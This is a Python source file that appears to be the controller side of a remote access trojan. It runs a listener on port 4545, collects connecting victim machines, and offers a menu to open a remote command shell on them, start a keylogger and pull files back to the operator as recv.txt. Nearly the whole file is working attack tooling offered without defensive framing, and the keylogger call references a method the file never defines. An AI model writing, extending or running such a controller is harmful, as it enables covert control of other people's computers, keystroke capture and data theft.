import socket
import threading



connectList = list()
addressList = list()
listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

class Listener:

    def connect(self):
        try:
            listener.bind(("",4545))
            listener.listen(-1)
        except:
            print("Connect Failed!")
            self.connect()
    def connectionOK(self):
        while True:
            try:
                connect,adress = listener.accept()
                connectList.append(connect)
                addressList.append(adress)
                print("Connection OK IP : {} , PORT : {}" .format(adress[0],adress[1]))
            except:
                break

    def connecting(self,index):
        connect = connectList[index]
        print(addressList[index][0] +"ip adress connnected!")
        return connect

    
    def sort(self):
        for index, connect in enumerate(connectList):
            try:
                connect.send("Hey Client!".encode())
            except:           
                addressList.pop(index)
                connectList.pop(index)
                continue
            print(str(index)+"  " + addressList[index][0] + "   " + str(addressList[index][1]))


    def main(self):
        while True:
            self.Maincommands()
            inp = input("Command [*]:")
            if inp == "list":
                self.sort()
            if "connect" in inp:
                number = int(inp[-1])
                connected = self.connecting(number)
                if connected:
                    self.socketTrans(number)

    def cmdshell(self,connect):
        while True:
            self.CmdShellCommands()
            request = input("Shell[*]:")
            if request == "exit":
                break
            encode = request.encode()
            connector = connectList[connect]
            connector.send(encode)
            reply = connector.recv(1024)
            print(reply.decode("cp437"))
            
    def download(self,connect):
        file = open("recv.txt", "wb") 
        print("\n Copied file name will be recv.txt at server side\n")
        connector = connectList[connect]
        encode = "download".encode()
        connector.send(encode)
        
        while True:
            RecvData = connector.recv(1024)
            while RecvData:
                file.write(RecvData)
                RecvData = connector.recv(1024)

            file.close()
            print("\n File has been copied successfully \n")

            connector.close()
            print("\n Server closed the connection \n")
            break

    def socketTrans(self,connect):
        while True:
            self.request = input("Transactions\n1-)Cmdshell\n2-)Keylogger start\n3-)Connection Kill\n4-)Download\n[*]:")
            if self.request == "3":
                listener.close()
                exit()
            elif self.request == "2":
                self.keylogger(request)          
            elif self.request == "1":
                self.cmdshell(connect)
            elif self.request =="4":
                self.download(connect)

    
    def Maincommands(self):
        print("Usage:list , connect [number]")
    def CmdShellCommands(self):
        print("Usage:exit or cmd command. Example: whoami, ipconfig ...")


_listenerObj = Listener()
_listenerObj.connect()
thread = threading.Thread(target= _listenerObj.connectionOK)
connectok = threading.Thread(target=_listenerObj.main)
thread.start()
connectok.start()